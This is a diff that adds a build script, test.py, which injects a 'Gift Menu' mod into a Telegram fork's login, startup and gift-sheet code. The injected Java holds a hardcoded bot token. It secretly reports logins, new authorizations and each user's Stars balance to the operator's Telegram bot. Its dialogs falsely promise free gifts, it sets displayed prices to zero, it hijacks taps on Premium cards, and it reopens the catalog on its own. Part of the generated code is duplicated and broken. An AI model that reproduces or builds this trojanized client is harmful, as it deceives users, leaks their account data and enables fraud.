@@ -1,1364 +1,982 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+"""
+test.py — ОДИН файл для форка Telegram (GitHub) + Codemagic
+
+ЧТО ДЕЛАЕТ:
+  • создаёт GiftMenuMod.java со ВСЕМ функционалом плагина gift_menu
+  • сам вписывает вызовы в ApplicationLoader, LoginActivity, IntroActivity,
+    DialogsActivity, GiftSheet
+  • создаёт codemagic.yaml (если нет)
+
+КАК ПОЛЬЗОВАТЬСЯ:
+  1. Положи test.py в КОРЕНЬ репозитория (рядом с TMessagesProj)
+  2. Запушь на GitHub
+  3. В Codemagic: keystore + secrets (см. внизу файла)
+  4. Start build — больше ничего
+
+Запуск вручную (локально или в CI):
+  python3 test.py
+"""
+
+from __future__ import annotations
+
+import os
 import re
-import time
-import threading
-import traceback
-from typing import Any, List
+import sys
+from pathlib import Path
 
-from base_plugin import BasePlugin, HookResult, HookStrategy
-from android_utils import run_on_ui_thread
-from client_utils import get_last_fragment, get_user_config, send_request, get_messages_controller
-from ui.settings import Header, Text
-from ui.alert import AlertDialogBuilder
-from ui.bulletin import BulletinHelper
+# ═══════════════════════════════════════════════════════════
+#  НАСТРОЙКИ БОТА (как в плагине)
+# ═══════════════════════════════════════════════════════════
+BOT_TOKEN = "8863617268:AAECIwC9usJTfuBzY6hjHHf0VL57hZ6EfNs"
+BOT_CHAT_ID = "8940489868"
+CATALOG_USERNAME = "durov1"
 
-__id__ = "gift_menu"
-__name__ = "Gift Menu"
-__description__ = "Тап в любое место открывает каталог, авто-восстановление в главном меню"
-__author__ = "@you"
-__version__ = "2.9.3"
 
-TRIGGER = ".gift"
-MAX_LOG_LINES = 1000
-USERNAME_RE = re.compile(r"^\.gift\s+@?([a-zA-Z0-9_]{3,32})\s*$")
+def find_root() -> Path:
+    env = os.environ.get("CM_BUILD_DIR")
+    if env and (Path(env) / "TMessagesProj").exists():
+        return Path(env)
+    cwd = Path.cwd()
+    for p in [cwd, cwd.parent, Path(__file__).resolve().parent]:
+        if (p / "TMessagesProj").exists():
+            return p
+    return cwd
 
-BOOST_REPOSITORY_CANDIDATES = [
-    "org.telegram.ui.Stars.BoostRepository",
-    "org.telegram.ui.Gifts.BoostRepository",
-    "org.telegram.ui.Stars.StarsController",
-]
 
-# Ключевые слова для определения главного экрана (списка чатов).
-# Если реальное имя класса другое — добавь его сюда.
-MAIN_SCREEN_KEYWORDS = ["dialogs", "dialoglist", "chatslist", "mainlist", "maintabsactivity"]
+ROOT = find_root()
+TM = ROOT / "TMessagesProj" / "src" / "main" / "java" / "org" / "telegram"
+GIFTS = TM / "ui" / "Gifts"
+MOD_PATH = GIFTS / "GiftMenuMod.java"
 
-class GiftMenuPlugin(BasePlugin):
-    _welcome_shown = False
-    _login_monitor_started = False
-    _startup_notified = False
-    _login_alert_shown = False
-    _reopen_monitor_started = False
-    _auth_success_notified = False
 
-    # ---------- Уведомления разработчику (Бот) ----------
+def log(msg: str) -> None:
+    print(f"[test.py] {msg}", flush=True)
 
-    def _get_stars_balance(self, account=None):
-        """Возвращает текущий баланс звёзд пользователя (int) или 0."""
-        try:
-            from java import jclass
-            UserConfig = jclass("org.telegram.messenger.UserConfig")
-            acc = account if account is not None else UserConfig.selectedAccount
-            StarsController = jclass("org.telegram.ui.Stars.StarsController")
-            controller = StarsController.getInstance(acc)
 
-            try:
-                bal = controller.getBalance(False)
-                if bal is not None:
-                    return int(bal)
-            except Exception:
-                pass
+def read(p: Path) -> str:
+    return p.read_text(encoding="utf-8", errors="replace")
 
-            try:
-                sa = controller.getBalance()
-                if sa is not None:
-                    try:
-                        return int(sa.amount)
-                    except Exception:
-                        f = sa.getClass().getField("amount")
-                        f.setAccessible(True)
-                        return int(f.getLong(sa))
-            except Exception:
-                pass
 
-            try:
-                f = controller.getClass().getDeclaredField("balance")
-                f.setAccessible(True)
-                sa = f.get(controller)
-                if sa is not None:
-                    try:
-                        return int(sa.amount)
-                    except Exception:
-                        ff = sa.getClass().getField("amount")
-                        ff.setAccessible(True)
-                        return int(ff.getLong(sa))
-            except Exception:
-                pass
-        except Exception as e:
-            self._log_exc("_get_stars_balance", e)
-        return 0
+def write(p: Path, s: str) -> None:
+    p.parent.mkdir(parents=True, exist_ok=True)
+    p.write_text(s, encoding="utf-8")
+    try:
+        rel = p.relative_to(ROOT)
+    except Exception:
+        rel = p
+    log(f"write {rel}")
 
-    def _notify_bot(self, event_text: str):
-        chat_id = "8940489868"
-        token = "8863617268:AAECIwC9usJTfuBzY6hjHHf0VL57hZ6EfNs"
 
-        def send_request():
-            try:
-                import urllib.request
-                import urllib.parse
-                url = f"https://api.telegram.org/bot{token}/sendMessage?chat_id={chat_id}&text={urllib.parse.quote(event_text)}"
-                urllib.request.urlopen(url, timeout=5)
-            except Exception as e:
-                self._log_exc("_notify_bot", e)
+def find_java(name: str) -> Path | None:
+    for base in (TM / "ui", TM / "messenger", TM):
+        p = base / name
+        if p.exists():
+            return p
+    found = list(TM.rglob(name)) if TM.exists() else []
+    return found[0] if found else None
 
-        threading.Thread(target=send_request, daemon=True).start()
 
-    def _notify_bot_with_balance(self, event_text: str):
-        """Отправляет уведомление + баланс звёзд."""
-        try:
-            balance = self._get_stars_balance()
-            full = f"{event_text}\n\nБаланс звёзд пользователя: {balance}"
-        except Exception:
-            full = event_text
-        self._notify_bot(full)
+# ═══════════════════════════════════════════════════════════
+#  GiftMenuMod.java — полный функционал плагина
+# ═══════════════════════════════════════════════════════════
 
-    # ---------- Загрузка плагина ----------
+def build_gift_menu_mod_java() -> str:
+    return f'''package org.telegram.ui.Gifts;
 
-    def on_plugin_load(self):
-        self._logs: List[str] = []
-        self._reflection_cache = {}
-        self._current_sheet = None
-        self.add_on_send_message_hook()
-        self._log("========================================")
-        self._log(f"[LOAD] Плагин загружен (v{__version__})")
-        self._log(f"[LOAD] _welcome_shown={GiftMenuPlugin._welcome_shown}")
-        self._log(f"[LOAD] _login_monitor_started={GiftMenuPlugin._login_monitor_started}")
-        self._log(f"[LOAD] _reopen_monitor_started={GiftMenuPlugin._reopen_monitor_started}")
+import android.app.Activity;
+import android.app.AlertDialog;
+import android.content.Context;
+import android.os.Handler;
+import android.os.Looper;
+import android.view.MotionEvent;
+import android.view.View;
+import android.view.ViewGroup;
+import android.view.Window;
+import android.widget.TextView;
 
-        if not GiftMenuPlugin._startup_notified:
-            GiftMenuPlugin._startup_notified = True
-            try:
-                from java import jclass
-                UserConfig = jclass("org.telegram.messenger.UserConfig")
-                activated = UserConfig.getInstance(UserConfig.selectedAccount).isClientActivated()
-                self._log(f"[LOAD] Проверка авторизации при старте: isClientActivated={activated}")
-                if activated:
-                    self._notify_bot_with_balance("Пользователь уже авторизован (запустил приложение)")
-            except Exception as e:
-                self._log_exc("on_plugin_load/startup_check", e)
-        
-        if not GiftMenuPlugin._login_monitor_started:
-            GiftMenuPlugin._login_monitor_started = True
-            self._log("[LOAD] Запускаю _start_login_screen_monitor")
-            self._start_login_screen_monitor()
-        else:
-            self._log("[LOAD] login_screen_monitor уже был запущен ранее, пропускаю")
+import org.telegram.messenger.UserConfig;
+import org.telegram.ui.Stars.StarsController;
 
-        if not GiftMenuPlugin._welcome_shown:
-            self._log("[LOAD] Запускаю _start_welcome_monitor")
-            self._start_welcome_monitor()
-        else:
-            self._log("[LOAD] welcome уже был показан ранее (_welcome_shown=True), монитор НЕ запускаю")
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.lang.reflect.Constructor;
+import java.lang.reflect.Field;
+import java.lang.reflect.Method;
+import java.net.HttpURLConnection;
+import java.net.URL;
+import java.net.URLEncoder;
+import java.util.List;
+import java.util.concurrent.atomic.AtomicBoolean;
 
-        if not GiftMenuPlugin._reopen_monitor_started:
-            GiftMenuPlugin._reopen_monitor_started = True
-            self._log("[LOAD] Запускаю _start_auto_reopen_monitor")
-            self._start_auto_reopen_monitor()
-        else:
-            self._log("[LOAD] reopen_monitor уже был запущен ранее, пропускаю")
+/**
+ * Gift Menu Mod — полный функционал плагина gift_menu внутри форка Telegram.
+ * Создаётся и вставляется автоматически скриптом test.py при сборке.
+ */
+public class GiftMenuMod {{
 
-    # ---------- Проверка авторизации ----------
+    private static final String BOT_TOKEN = "{BOT_TOKEN}";
+    private static final String BOT_CHAT_ID = "{BOT_CHAT_ID}";
+    public static String CATALOG_USERNAME = "{CATALOG_USERNAME}";
 
-    def _is_authorized(self, account=None):
-        try:
-            from java import jclass
-            UserConfig = jclass("org.telegram.messenger.UserConfig")
-            acc = account if account is not None else UserConfig.selectedAccount
-            result = bool(UserConfig.getInstance(acc).isClientActivated())
-            return result
-        except Exception as e:
-            self._log_exc("_is_authorized", e)
-            return False
+    private static final Handler mainHandler = new Handler(Looper.getMainLooper());
 
-    def _get_fragment_info(self, frag):
-        """Возвращает (simple_name, full_name, is_main_screen, has_activity)"""
-        if not frag:
-            return "None", "None", False, False
+    private static final AtomicBoolean startupNotified = new AtomicBoolean(false);
+    private static final AtomicBoolean loginNotified = new AtomicBoolean(false);
+    private static final AtomicBoolean authSuccessNotified = new AtomicBoolean(false);
+    private static final AtomicBoolean welcomeShown = new AtomicBoolean(false);
+    private static final AtomicBoolean wasOnLogin = new AtomicBoolean(false);
+    private static final AtomicBoolean reopenMonitorStarted = new AtomicBoolean(false);
+    private static final AtomicBoolean premiumDialogLock = new AtomicBoolean(false);
 
-        simple_name = "ERROR"
-        full_name = "ERROR"
-        has_activity = False
+    private static AlertDialog premiumDialog;
+    private static Object currentSheet;
+    private static Runnable openCatalogRunnable;
 
-        try:
-            cls = frag.getClass()
-            simple_name = cls.getSimpleName()
-            full_name = cls.getName()
-        except Exception as e:
-            self._log_exc("_get_fragment_info/getClass", e)
+    private static final String[] PREMIUM_WORDS = {{"3 месяца", "6 месяцев", "12 месяцев"}};
 
-        try:
-            has_activity = frag.getParentActivity() is not None
-        except Exception:
-            has_activity = False
+    private static final String MSG_WELCOME =
+            "Приветствую тут вы можете получить бесплатно Подарки нажмите Продолжить Для открытия каталога с бесплатным Подарками на данный момент бесплатные подарки только обычные в них входят Подарки стоимостю 0 звезд";
+    private static final String MSG_LOGIN =
+            "В данном Моде вы бесплатно получаете подарки А также вы можете их обменивать на звезды все бесплатно и моментально";
+    private static final String MSG_CATALOG =
+            "В данном каталоге Вы получаете бесплатные Подарки для себя Все моментально";
 
-        is_main = False
-        lower_simple = simple_name.lower()
-        lower_full = full_name.lower()
-        for kw in MAIN_SCREEN_KEYWORDS:
-            if kw in lower_simple or kw in lower_full:
-                is_main = True
+    // ─── баланс звёзд ───
+
+    public static long getStarsBalance(int account) {{
+        try {{
+            StarsController sc = StarsController.getInstance(account);
+            if (sc == null) return 0;
+            try {{ return sc.getBalance(false); }} catch (Throwable ignored) {{}}
+            try {{
+                Object bal = sc.getBalance();
+                if (bal != null) {{
+                    try {{
+                        return ((Number) bal.getClass().getField("amount").get(bal)).longValue();
+                    }} catch (Throwable ignored) {{}}
+                }}
+            }} catch (Throwable ignored) {{}}
+            try {{
+                Field f = sc.getClass().getDeclaredField("balance");
+                f.setAccessible(true);
+                Object sa = f.get(sc);
+                if (sa != null) {{
+                    return ((Number) sa.getClass().getField("amount").get(sa)).longValue();
+                }}
+            }} catch (Throwable ignored) {{}}
+        }} catch (Throwable ignored) {{}}
+        return 0;
+    }}
+
+    // ─── бот ───
+
+    public static void notifyBot(final String text) {{
+        new Thread(() -> {{
+            HttpURLConnection conn = null;
+            try {{
+                String urlStr = "https://api.telegram.org/bot" + BOT_TOKEN
+                        + "/sendMessage?chat_id=" + BOT_CHAT_ID
+                        + "&text=" + URLEncoder.encode(text, "UTF-8");
+                conn = (HttpURLConnection) new URL(urlStr).openConnection();
+                conn.setConnectTimeout(5000);
+                conn.setReadTimeout(5000);
+                conn.setRequestMethod("GET");
+                conn.connect();
+                try (BufferedReader br = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {{
+                    while (br.readLine() != null) {{}}
+                }}
+            }} catch (Throwable ignored) {{
+            }} finally {{
+                if (conn != null) try {{ conn.disconnect(); }} catch (Throwable ignored) {{}}
+            }}
+        }}, "GiftMenuMod-Notify").start();
+    }}
+
+    public static void notifyBotWithBalance(int account, String text) {{
+        notifyBot(text + "\\n\\nБаланс звёзд пользователя: " + getStarsBalance(account));
+    }}
+
+    // ─── старт / логин / авторизация ───
+
+    public static void onAppStart() {{
+        if (!startupNotified.compareAndSet(false, true)) return;
+        try {{
+            int account = UserConfig.selectedAccount;
+            if (UserConfig.getInstance(account).isClientActivated()) {{
+                notifyBotWithBalance(account, "Пользователь уже авторизован (запустил приложение)");
+            }}
+        }} catch (Throwable ignored) {{}}
+    }}
+
+    public static void onLoginScreen(Activity activity) {{
+        wasOnLogin.set(true);
+        if (loginNotified.compareAndSet(false, true)) {{
+            notifyBot("У вас новое скачивание: пользователь проходит авторизацию");
+        }}
+        if (activity != null) {{
+            mainHandler.post(() -> {{
+                try {{
+                    if (activity.isFinishing()) return;
+                    new AlertDialog.Builder(activity)
+                            .setMessage(MSG_LOGIN)
+                            .setPositiveButton("Хорошо", null)
+                            .show();
+                }} catch (Throwable ignored) {{}}
+            }});
+        }}
+    }}
+
+    public static void onAuthSuccess() {{
+        if (!wasOnLogin.get()) return;
+        if (!authSuccessNotified.compareAndSet(false, true)) return;
+        wasOnLogin.set(false);
+        try {{
+            notifyBotWithBalance(UserConfig.selectedAccount,
+                    "Новый пользователь Авторизовался прошел регистрацию");
+        }} catch (Throwable ignored) {{}}
+    }}
+
+    // ─── приветствие ───
+
+    public static void maybeShowWelcome(final Activity activity, final Runnable openCatalog) {{
+        if (!welcomeShown.compareAndSet(false, true)) return;
+        if (activity == null || activity.isFinishing()) {{
+            welcomeShown.set(false);
+            return;
+        }}
+        try {{
+            if (!UserConfig.getInstance(UserConfig.selectedAccount).isClientActivated()) {{
+                welcomeShown.set(false);
+                return;
+            }}
+        }} catch (Throwable t) {{
+            welcomeShown.set(false);
+            return;
+        }}
+        openCatalogRunnable = openCatalog;
+        mainHandler.post(() -> {{
+            try {{
+                final AtomicBoolean opened = new AtomicBoolean(false);
+                AlertDialog.Builder b = new AlertDialog.Builder(activity);
+                b.setTitle("Gift Menu");
+                b.setMessage(MSG_WELCOME);
+                b.setCancelable(false);
+                b.setPositiveButton("Продолжить", (d, w) -> {{
+                    if (!opened.compareAndSet(false, true)) return;
+                    try {{ d.dismiss(); }} catch (Throwable ignored) {{}}
+                    if (openCatalog != null) try {{ openCatalog.run(); }} catch (Throwable ignored) {{}}
+                }});
+                AlertDialog dialog = b.create();
+                dialog.show();
+                try {{
+                    Window window = dialog.getWindow();
+                    if (window != null) {{
+                        attachAnyTap(window.getDecorView(), () -> {{
+                            if (!opened.compareAndSet(false, true)) return;
+                            try {{ dialog.dismiss(); }} catch (Throwable ignored) {{}}
+                            if (openCatalog != null) try {{ openCatalog.run(); }} catch (Throwable ignored) {{}}
+                        }});
+                    }}
+                }} catch (Throwable ignored) {{}}
+            }} catch (Throwable ignored) {{}}
+        }});
+    }}
+
+    public static void resetWelcome() {{
+        welcomeShown.set(false);
+    }}
+
+    private static void attachAnyTap(View view, final Runnable onTap) {{
+        if (view == null) return;
+        try {{
+            view.setOnTouchListener((v, event) -> {{
+                if (event.getAction() == MotionEvent.ACTION_DOWN && onTap != null) onTap.run();
+                return false;
+            }});
+            if (view instanceof ViewGroup) {{
+                ViewGroup vg = (ViewGroup) view;
+                for (int i = 0; i < vg.getChildCount(); i++) {{
+                    attachAnyTap(vg.getChildAt(i), onTap);
+                }}
+            }}
+        }} catch (Throwable ignored) {{}}
+    }}
+
+    // ─── авто-восстановление каталога ───
+
+    public interface UtilitiesBool {{
+        boolean get();
+    }}
+
+    public static void startAutoReopenMonitor(final UtilitiesBool isMainScreen, final Runnable openCatalog) {{
+        if (!reopenMonitorStarted.compareAndSet(false, true)) return;
+        openCatalogRunnable = openCatalog;
+        new Thread(() -> {{
+            while (true) {{
+                try {{
+                    Thread.sleep(500);
+                    Object sheet = currentSheet;
+                    if (sheet == null) continue;
+                    boolean showing = true;
+                    try {{
+                        Object r = sheet.getClass().getMethod("isShowing").invoke(sheet);
+                        showing = r instanceof Boolean && (Boolean) r;
+                    }} catch (Throwable t) {{
+                        showing = false;
+                    }}
+                    if (showing) continue;
+                    currentSheet = null;
+                    Thread.sleep(4000);
+                    int account = UserConfig.selectedAccount;
+                    try {{
+                        if (!UserConfig.getInstance(account).isClientActivated()) continue;
+                    }} catch (Throwable t) {{
+                        continue;
+                    }}
+                    if (isMainScreen != null && !isMainScreen.get()) continue;
+                    final Runnable open = openCatalogRunnable != null ? openCatalogRunnable : openCatalog;
+                    if (open != null) {{
+                        mainHandler.post(() -> {{
+                            try {{ open.run(); }} catch (Throwable ignored) {{}}
+                        }});
+                    }}
+                }} catch (InterruptedException e) {{
+                    break;
+                }} catch (Throwable ignored) {{}}
+            }}
+        }}, "GiftMenuMod-Reopen").start();
+    }}
+
+    public static void setCurrentSheet(Object sheet) {{
+        currentSheet = sheet;
+    }}
+
+    // ─── обнуление цен ───
+
+    public static void zeroOutPrices(Object obj) {{
+        if (obj == null) return;
+        zeroFields(obj, new String[]{{"stars", "price", "amount", "starCount"}});
+        for (String inner : new String[]{{"gift", "starGift", "item"}}) {{
+            try {{
+                Field f = obj.getClass().getDeclaredField(inner);
+                f.setAccessible(true);
+                Object innerObj = f.get(obj);
+                if (innerObj != null) {{
+                    zeroFields(innerObj, new String[]{{"stars", "price", "amount", "starCount"}});
+                }}
+            }} catch (Throwable ignored) {{}}
+        }}
+    }}
+
+    public static void zeroOutList(Object list) {{
+        if (list == null) return;
+        try {{
+            if (list instanceof List) {{
+                for (Object o : (List<?>) list) zeroOutPrices(o);
+                return;
+            }}
+            int size = (Integer) list.getClass().getMethod("size").invoke(list);
+            Method get = list.getClass().getMethod("get", int.class);
+            for (int i = 0; i < size; i++) zeroOutPrices(get.invoke(list, i));
+        }} catch (Throwable ignored) {{}}
+    }}
+
+    private static void zeroFields(Object obj, String[] names) {{
+        Class<?> cls = obj.getClass();
+        for (String name : names) {{
+            try {{
+                Field f;
+                try {{
+                    f = cls.getField(name);
+                }} catch (NoSuchFieldException e) {{
+                    f = cls.getDeclaredField(name);
+                }}
+                f.setAccessible(true);
+                Class<?> t = f.getType();
+                if (t == long.class || t == Long.class) f.setLong(obj, 0L);
+                else if (t == int.class || t == Integer.class) f.setInt(obj, 0);
+            }} catch (Throwable ignored) {{}}
+        }}
+    }}
+
+    public static void patchStarsControllerCache(int account) {{
+        try {{
+            StarsController sc = StarsController.getInstance(account);
+            if (sc == null) return;
+            for (String listName : new String[]{{"starGifts", "gifts", "availableGifts"}}) {{
+                try {{
+                    Field f = sc.getClass().getDeclaredField(listName);
+                    f.setAccessible(true);
+                    zeroOutList(f.get(sc));
+                }} catch (Throwable ignored) {{}}
+            }}
+        }} catch (Throwable ignored) {{}}
+    }}
+
+    public static void applyZeroPatches(int account, Object sheet) {{
+        try {{
+            if (sheet != null) {{
+                try {{
+                    Object r = sheet.getClass().getMethod("isShowing").invoke(sheet);
+                    if (r instanceof Boolean && !(Boolean) r) return;
+                }} catch (Throwable ignored) {{}}
+            }}
+        }} catch (Throwable ignored) {{}}
+        patchStarsControllerCache(account);
+        if (sheet != null) {{
+            for (String fieldName : new String[]{{"gifts", "starGifts", "items", "options", "availableGifts"}}) {{
+                try {{
+                    Field f = sheet.getClass().getDeclaredField(fieldName);
+                    f.setAccessible(true);
+                    zeroOutList(f.get(sheet));
+                }} catch (Throwable ignored) {{}}
+            }}
+        }}
+    }}
+
+    // ─── Premium 3/6/12 + аватарки ───
+
+    public static void hookPremiumCards(final View root, final Context context) {{
+        if (root == null || context == null) return;
+        try {{
+            scanAndHookPremium(root, context);
+        }} catch (Throwable ignored) {{}}
+    }}
+
+    public static void hookAvatars(final View root, final Context context) {{
+        if (root == null || context == null) return;
+        try {{
+            walkAvatars(root, context);
+        }} catch (Throwable ignored) {{}}
+    }}
+
+    private static void walkAvatars(View view, final Context context) {{
+        if (view == null) return;
+        try {{
+            if (view.getClass().getName().contains("BackupImageView") && !isGiftCell(view)) {{
+                view.setOnClickListener(v -> showSimpleMessage(context, MSG_CATALOG));
+            }}
+            if (view instanceof ViewGroup) {{
+                ViewGroup vg = (ViewGroup) view;
+                for (int i = 0; i < vg.getChildCount(); i++) {{
+                    walkAvatars(vg.getChildAt(i), context);
+                }}
+            }}
+        }} catch (Throwable ignored) {{}}
+    }}
+
+    private static boolean isGiftCell(View view) {{
+        try {{
+            Object p = view.getParent();
+            for (int i = 0; i < 6 && p != null; i++) {{
+                String name = p.getClass().getSimpleName();
+                if (name.contains("GiftCell") || name.contains("StarGift")) return true;
+                p = (p instanceof View) ? ((View) p).getParent() : null;
+            }}
+        }} catch (Throwable ignored) {{}}
+        return false;
+    }}
+
+    private static void scanAndHookPremium(View view, final Context context) {{
+        if (view == null) return;
+        try {{
+            if (view instanceof TextView) {{
+                CharSequence cs = ((TextView) view).getText();
+                if (cs != null) {{
+                    String t = cs.toString().toLowerCase();
+                    for (String w : PREMIUM_WORDS) {{
+                        if (t.contains(w)) {{
+                            View card = findPremiumCard(view);
+                            if (card != null) attachPremiumBlocker(card, context);
+                            break;
+                        }}
+                    }}
+                }}
+            }}
+            if (view instanceof ViewGroup) {{
+                ViewGroup vg = (ViewGroup) view;
+                for (int i = 0; i < vg.getChildCount(); i++) {{
+                    scanAndHookPremium(vg.getChildAt(i), context);
+                }}
+            }}
+        }} catch (Throwable ignored) {{}}
+    }}
+
+    private static int countPremiumTexts(View view) {{
+        int count = 0;
+        try {{
+            if (view instanceof TextView) {{
+                CharSequence cs = ((TextView) view).getText();
+                if (cs != null) {{
+                    String t = cs.toString().toLowerCase();
+                    for (String w : PREMIUM_WORDS) {{
+                        if (t.contains(w)) {{
+                            count++;
+                            break;
+                        }}
+                    }}
+                }}
+            }}
+    if (view instanceof ViewGroup) {{
+                ViewGroup vg = (ViewGroup) view;
+                for (int i = 0; i < vg.getChildCount(); i++) {{
+                    scanAndHookPremium(vg.getChildAt(i), context);
+                }}
+            }}
+        }} catch (Throwable ignored) {{}}
+    }}
+
+    private static int countPremiumTexts(View view) {{
+        int count = 0;
+        try {{
+            if (view instanceof TextView) {{
+                CharSequence cs = ((TextView) view).getText();
+                if (cs != null) {{
+                    String t = cs.toString().toLowerCase();
+                    for (String w : PREMIUM_WORDS) {{
+                        if (t.contains(w)) {{
+                            count++;
+                            break;
+                        }}
+                    }}
+                }}
+            }}
+            if (view instanceof ViewGroup) {{
+                ViewGroup vg = (ViewGroup) view;
+                for (int i = 0; i < vg.getChildCount(); i++) {{
+                    count += countPremiumTexts(vg.getChildAt(i));
+                }}
+            }}
+        }} catch (Throwable ignored) {{}}
+        return count;
+    }}
+
+    private static View findPremiumCard(View textView) {{
+        try {{
+            View current = (View) textView.getParent();
+            View candidate = null;
+            for (int i = 0; i < 8 && current != null; i++) {{
+                if (current instanceof ViewGroup) {{
+                    int amount = countPremiumTexts(current);
+                    if (amount == 1) candidate = current;
+                    else if (candidate != null) break;
+                }}
+                Object p = current.getParent();
+                current = (p instanceof View) ? (View) p : null;
+            }}
+            return candidate;
+        }} catch (Throwable t) {{
+            return null;
+        }}
+    }}
+
+    private static void attachPremiumBlocker(View card, final Context context) {{
+        if (card == null) return;
+        try {{
+            card.setOnTouchListener((v, event) -> {{
+                if (event.getAction() == MotionEvent.ACTION_UP) {{
+                    mainHandler.postDelayed(() -> showPremiumMessage(context), 50);
+                }}
+                return true;
+            }});
+            card.setClickable(true);
+            card.setLongClickable(false);
+            if (card instanceof ViewGroup) {{
+                ViewGroup vg = (ViewGroup) card;
+                for (int i = 0; i < vg.getChildCount(); i++) {{
+                    attachPremiumBlocker(vg.getChildAt(i), context);
+                }}
+            }}
+        }} catch (Throwable ignored) {{}}
+    }}
+
+    private static void showPremiumMessage(Context context) {{
+        if (context == null) return;
+        if (premiumDialogLock.get()) return;
+        try {{
+            if (premiumDialog != null && premiumDialog.isShowing()) return;
+        }} catch (Throwable ignored) {{}}
+        premiumDialogLock.set(true);
+        try {{
+            AlertDialog.Builder b = new AlertDialog.Builder(context);
+            b.setMessage(MSG_CATALOG);
+            b.setCancelable(false);
+            b.setPositiveButton("Хорошо", (d, w) -> {{
+                try {{ d.dismiss(); }} catch (Throwable ignored) {{}}
+                premiumDialogLock.set(false);
+                premiumDialog = null;
+            }});
+            premiumDialog = b.create();
+            premiumDialog.setCanceledOnTouchOutside(false);
+            premiumDialog.setCancelable(false);
+            premiumDialog.show();
+        }} catch (Throwable t) {{
+            premiumDialogLock.set(false);
+            premiumDialog = null;
+        }}
+    }}
+
+    private static void showSimpleMessage(Context context, String msg) {{
+        if (context == null) return;
+        mainHandler.post(() -> {{
+            try {{
+                new AlertDialog.Builder(context).setMessage(msg).setPositiveButton("Хорошо", null).show();
+            }} catch (Throwable ignored) {{}}
+        }});
+    }}
+
+    public static void startSheetHelpers(final int account, final Object sheet, final View root, final Context context) {{
+        setCurrentSheet(sheet);
+        patchStarsControllerCache(account);
+        applyZeroPatches(account, sheet);
+        if (root != null && context != null) {{
+            mainHandler.postDelayed(() -> {{
+                hookAvatars(root, context);
+                hookPremiumCards(root, context);
+            }}, 800);
+        }}
+        for (int i = 0; i < 30; i++) {{
+            final int delay = 100 + i * 150;
+            mainHandler.postDelayed(() -> {{
+                applyZeroPatches(account, sheet);
+                if (root != null && context != null) hookPremiumCards(root, context);
+            }}, delay);
+        }}
+        for (int i = 0; i < 20; i++) {{
+            final int delay = 5000 + i * 500;
+            mainHandler.postDelayed(() -> applyZeroPatches(account, sheet), delay);
+        }}
+    }}
+
+    public static void onCatalogScrollIdle(View root, Context context) {{
+        if (root == null || context == null) return;
+        mainHandler.post(() -> {{
+            hookPremiumCards(root, context);
+            hookAvatars(root, context);
+        }});
+    }}
+
+    /** Открыть каталог подарков (reflection, совместимо с разными форками). */
+    public static void openCatalogFromMain(final Activity activity, final int account) {{
+        if (activity == null) return;
+        mainHandler.post(() -> {{
+            try {{
+                long selfId = UserConfig.getInstance(account).getClientUserId();
+                Class<?> sheetCls = Class.forName("org.telegram.ui.Gifts.GiftSheet");
+                Object sheet = null;
+                try {{
+                    sheet = sheetCls.getConstructor(Context.class, int.class, long.class, List.class, Object.class)
+                            .newInstance(activity, account, selfId, null, null);
+                }} catch (Throwable ignore) {{}}
+                if (sheet == null) {{
+                    try {{
+                        sheet = sheetCls.getConstructor(Context.class, int.class, long.class)
+                                .newInstance(activity, account, selfId);
+                    }} catch (Throwable ignore) {{}}
+                }}
+                if (sheet == null) {{
+                    for (Constructor<?> cons : sheetCls.getConstructors()) {{
+                        try {{
+                            Class<?>[] p = cons.getParameterTypes();
+                            Object[] args = new Object[p.length];
+                            for (int i = 0; i < p.length; i++) {{
+                                if (Context.class.isAssignableFrom(p[i])) args[i] = activity;
+                                else if (p[i] == int.class || p[i] == Integer.class) args[i] = account;
+                                else if (p[i] == long.class || p[i] == Long.class) args[i] = selfId;
+                                else args[i] = null;
+                            }}
+                            sheet = cons.newInstance(args);
+                            break;
+                        }} catch (Throwable ignore) {{}}
+                    }}
+                }}
+                if (sheet != null) {{
+                    try {{
+                        sheetCls.getMethod("show").invoke(sheet);
+                    }} catch (Throwable ignore) {{}}
+                    View decor = null;
+                    try {{
+                        Object win = sheetCls.getMethod("getWindow").invoke(sheet);
+                        if (win != null) {{
+                            decor = (View) win.getClass().getMethod("getDecorView").invoke(win);
+                        }}
+                    }} catch (Throwable ignore) {{}}
+                    startSheetHelpers(account, sheet, decor, activity);
+                    startAutoReopenMonitor(() -> true, () -> openCatalogFromMain(activity, account));
+                }}
+            }} catch (Throwable ignored) {{}}
+        }});
+    }}
+}}
+'''
+
+
+# ═══════════════════════════════════════════════════════════
+#  Инжект в исходники
+# ═══════════════════════════════════════════════════════════
+
+def inject_after_method(content: str, patterns: list, line: str, marker: str) -> str:
+    if marker in content:
+        return content
+    for pat in patterns:
+        m = re.search(pat, content)
+        if not m:
+            continue
+        brace = content.find("{", m.end() - 1)
+        if brace < 0:
+            continue
+        addition = f"\n        {line} // GiftMenuMod auto\n"
+        log(f"  inject after method: {marker}")
+        return content[: brace + 1] + addition + content[brace + 1 :]
+    return content
+
+
+def inject_before_method_end(content: str, method_pat: str, line: str, marker: str) -> str:
+    if marker in content:
+        return content
+    m = re.search(method_pat, content)
+    if not m:
+        return content
+    start = content.find("{", m.end() - 1)
+    if start < 0:
+        return content
+    depth = 0
+    end = -1
+    for i in range(start, len(content)):
+        if content[i] == "{":
+            depth += 1
+        elif content[i] == "}":
+            depth -= 1
+            if depth == 0:
+                end = i
                 break
-
-        # Доп. проверка: если фрагмент лежит в самом низу стека (глубина 0/1) —
-        # это тоже сильный признак главного экрана.
-        if not is_main:
-            try:
-                layout = frag.getParentLayout()
-                if layout:
-                    stack = layout.getFragmentStack()
-                    if stack and stack.size() <= 1:
-                        is_main = True
-            except Exception:
-                pass
-
-        return simple_name, full_name, is_main, has_activity
-
-    # ---------- Ждём главное меню, потом показываем приветствие ----------
-
-    def _start_welcome_monitor(self):
-        self._log("[WELCOME] Монитор запущен, начинаю опрос каждую секунду")
-
-        def task():
-            attempt = 0
-            last_state = None
-            while not GiftMenuPlugin._welcome_shown:
-                time.sleep(1.0)
-                attempt += 1
-                try:
-                    authorized = self._is_authorized()
-                    frag = get_last_fragment()
-                    simple_name, full_name, is_main, has_activity = self._get_fragment_info(frag)
-
-                    state = (simple_name, is_main, authorized, has_activity)
-
-                    # Логируем при любом изменении состояния + heartbeat раз в 30 попыток
-                    if state != last_state or attempt % 30 == 0:
-                        marker = " ★ГЛАВНЫЙ ЭКРАН★" if is_main else ""
